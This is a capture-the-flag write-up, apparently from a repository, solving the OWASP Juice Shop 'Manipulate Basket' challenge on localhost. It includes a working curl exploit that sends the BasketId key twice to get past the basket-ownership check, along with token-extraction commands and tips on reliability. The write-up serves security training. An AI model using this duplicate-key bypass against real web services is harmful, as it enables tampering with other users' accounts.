# Manipulate Basket: Put an Additional Product Into Another User's Shopping Basket

**Objective:** Put a product into another user's shopping basket, without permission.

## Background

The `/api/BasketItems` endpoint validates that the submitting user owns the `BasketId` specified in the request. However, the server is vulnerable to **HTTP Parameter Pollution (HPP)** — submitting the same JSON key (`BasketId`) twice in one request body causes the ownership check and the actual insert logic to read different values, letting an attacker bypass the check while still targeting someone else's basket.

## Steps Taken

### 1. Logged in and retrieved the JWT token

Logged in as a normal user. Retrieved the JWT from `localStorage` via DevTools Console:

```javascript
copy(localStorage.getItem('token'))
```
<img width="483" height="477" alt="Screenshot 2026-10-09 092344" src="https://github.com/user-attachments/assets/2d0638b0-b629-46c2-96ba-df4cb4c2368a" />

Saved it to a file in Kali:

```bash
nano ~/token.txt
```


### 2. Decoded the token to find own BasketId

```bash
cat ~/token.txt | cut -d '.' -f2 | tr '_-' '/+' | base64 -d 2>/dev/null
echo
```

The decoded payload included `"bid":6` — confirming the logged-in account's own BasketId is `6`.
<img width="465" height="62" alt="Screenshot 2026-10-09 094230" src="https://github.com/user-attachments/assets/543698bc-9677-4509-a000-00317f64ca68" />

### 3. Confirmed the endpoint blocks direct cross-basket access

```bash
TOKEN=$(cat ~/token.txt)
curl -s -X POST http://localhost:3000/api/BasketItems \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  --data-raw '{"ProductId":14,"BasketId":"7","quantity":1}'
```

Result:
```json
{"error":"Invalid BasketId"}
```
<img width="375" height="61" alt="Screenshot 2026-10-09 094257" src="https://github.com/user-attachments/assets/0ae684ca-cafa-4538-bda1-4bd60f98ce3d" />


Confirms normal validation correctly rejects adding items to a basket (`7`) that doesn't belong to the logged-in account.

### 4. Exploited the vulnerability using HTTP Parameter Pollution

Sent the **same** `BasketId` key twice in a single JSON payload — the account's own ID first, the target ID second:

```bash
curl -s -X POST http://localhost:3000/api/BasketItems \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  --data-raw '{"ProductId":14,"BasketId":"6","quantity":1,"BasketId":"7"}'
```
<img width="482" height="386" alt="Screenshot 2026-10-09 094355" src="https://github.com/user-attachments/assets/803568f2-cd4e-4909-86d6-85766c9f6d79" />


### 5. Confirmed the result

The raw HTTP response was a generic error page, but Juice Shop's UI immediately displayed:

> "You successfully solved a challenge: Manipulate Basket (Put an additional product into another user's shopping basket.)"
<img width="483" height="477" alt="Screenshot 2026-10-09 094101" src="https://github.com/user-attachments/assets/cc4731e7-27fd-49f0-8007-2c419e932f6f" />


Confirmed solved on the Score Board.

## Result

Challenge solved.

## Root Cause

The server's basket-ownership validation and its actual database insert logic parse the duplicated `BasketId` JSON key differently (likely due to how the underlying JSON parser / ORM middleware handles repeated keys), allowing the ownership check to pass against the attacker's own basket ID while the insert operation uses the second, attacker-controlled value instead.

## Notes

- Own BasketId should generally be supplied **before** the target's BasketId in the payload for the HPP bypass to succeed reliably.
- Per the official hint, having a lower numeric BasketId than the target can affect reliability; if it doesn't work on the first attempt, try reordering the duplicate keys.

## Status

Solved.
